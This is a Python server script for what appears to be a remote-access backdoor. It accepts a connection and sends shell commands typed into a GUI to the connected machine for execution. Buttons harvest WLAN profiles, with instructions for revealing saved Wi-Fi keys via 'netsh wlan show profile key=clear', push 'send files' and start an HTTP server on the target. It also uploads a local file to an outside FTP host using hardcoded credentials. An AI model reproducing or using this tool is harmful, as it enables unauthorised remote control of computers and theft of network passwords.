import socket
import sys
import subprocess
import webbrowser
import time
import tkinter as tk
import PySimpleGUI as sg
import PySimpleGUI as w
import PySimpleGUI as p
import multiprocessing
import os
import tqdm
import ftplib
FORMAT='utf-8'
from tkinter import *
BUFFER_SIZE=1048576
SEPARATOR="<SEPARATOR>"
# Fill Required Information

def progress():
    p.theme('Default1')

    BAR_MAX = 1000

# layout the Window
    layout = [[p.Text('LOADING...')],
          [p.ProgressBar(BAR_MAX, orientation='h', size=(20,20), key='-PROG-')],
          ]

    # create the Window
    window = p.Window('PROGRESS WINDOW', layout)
    # loop that would normally do something useful
    for i in range(1000):
   # check to see if the cancel button was clicked and exit loop if clicked
        event, values = window.read(timeout=10)
        if event == 'Cancel' or event == sg.WIN_CLOSED:
          break
        # update bar with loop value +1 so that bar eventually reaches the maximum
        window['-PROG-'].update(i+1)
# done with loop... need to destroy the window as it's still open
    window.close()
     
def filetransfer():
       
    
                 
                 
                 #filesize=os.path.getsize(filename)
                  
                 HOSTNAME = "ftp.dlptest.com"
                 USERNAME = "dlpuser"
                 PASSWORD = "rNrKYTX9g7z3RgJRmxWuGHbeu"          
 
                # Connect FTP Server
                 ftp_server = ftplib.FTP(HOSTNAME, USERNAME, PASSWORD)
 
                # force UTF-8 encoding
                 ftp_server.encoding = "utf-8"
 
                # Enter File Name with Extension
                 filename = r"C:\server\abc.py"
                 new='newfile'
                # Read file in binary mode
            
                 with open(filename,'rb') as file:
                      
                # Command for Uploading the file "STOR filename"
                      ftp_server.storbinary(f"STOR {new}", file)
           
                # Get list of files
                 ftp_server.dir()
 
                # Close the Connection
                 ftp_server.quit()
                 print("finished")
                  
                
                
    
# Create a socket

def create_socket():
    try:
        global host
        global port
        global s
        host = "127.0.0.1"
        port = 8888
        s = socket.socket()

    except socket.error as msg:
        print("Something went wrong while creating the socket." + str(msg)+"\n")


# Binding Port and Host together and listening for connection


def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port " + str(port)+"\n")

        s.bind((host, port))
        s.listen(5)  # After 5 bad connection s.listen() will throw error

    except socket.error as msg:
        print("Something went wrong while binding the port." + str(msg) + "\n Retrying...")
        bind_socket()


# Establishing connection/Accepting connection with a client (Socket must be listening)

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established, the IP is: " + str(address[0]) + " and the port is: " + str(address[1]) +"\n")
    send_commands(conn)
    conn.close()


# Send commands to client's computer, we are calling this above in socket_accept
def send_commands(conn):
    b='ipconfig'
    conn.send(str.encode(b))
   
    
    client_response = str(conn.recv(1048576), "utf-8")  # Receive incoming data in chunks of 1024 bits
    # then convert them to utf-8 format so that they could be converted to string
   
       
    sg.theme('Default1')
    layout = [  [sg.Text('Enter a command to execute (e.g. dir or ls)')],
                [sg.Input(key='_IN_')],             # input field where you'll type command
                [sg.Output(size=(90,35))],          # an output area where all print output will go
                [sg.Button('Run'), sg.Button('Exit'),sg.Button('refresh')],
                [sg.Button('wlan profiles'),sg.Button('key')],
                [sg.Button('send files')],
                [sg.Button('run http server')]]     # a couple of buttons
    
    window = sg.Window('Realtime Shell Command Output', layout)
    
    while True:     # Event Loop
        event, values = window.Read()
        cmd=values['_IN_']
        #default process
        print(client_response, end="")  # end="" puts the cursor in the terminal on next line
       
       
        if event in (None, 'Exit'):# checks if user wants to exit
            conn.close()
            s.close()
            sys.exit()
            break
        if event == 'key':
            w.theme('Default1')          
            w.popup_non_blocking('INSTRUCTIONS TO GET THE KEY','AFTER PRESSING WLAN PROFILES'' INPUT',"netsh wlan show profile _ _ _ _ _ _key=clear",'THE MAIN WINDOW')
           
           
        if event == 'Run':    # the two lines of code needed to get button and run command
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1048576), "utf-8")  # Receive incoming data in chunks of 1024 bits
             # then convert them to utf-8 format so that they could be converted to string
                print(client_response, end="")  # end="" puts the cursor in the terminal on next line
                
        if event == 'wlan profiles':
             p='netsh wlan show profile'
             conn.send(str.encode(p))
             client_response = str(conn.recv(1048576), "utf-8")  # Receive incoming data in chunks of 1024 bits
             # then convert them to utf-8 format so that they could be converted to string
             print(client_response, end="")  # end="" puts the cursor in the terminal on next line
            
             
       
             
        
             

        if event=='run http server':
            a='python3 -m http.server'
            conn.send(str.encode(a))
            webbrowser.open_new_tab('http://127.0.0.1:8000/')
        if event=='send files':
                 p='send files'
                 #sending the sending the command
                 conn.send(str.encode(p))
                 
                
                                   
        if event=='refresh':
          window.Refresh() if window else None 

            
            
    window.Close()

def main():
    process1 = multiprocessing.Process(target=filetransfer)
    process2 = multiprocessing.Process(target=progress)

    process1.start()
    process2.start()
    print("Starting the server-side script! \n")
    
    
    create_socket()
    bind_socket()
    socket_accept()
    bg=PhotoImage(file="1.gif")


#start the main funtion
if __name__=="__main__":
    main()

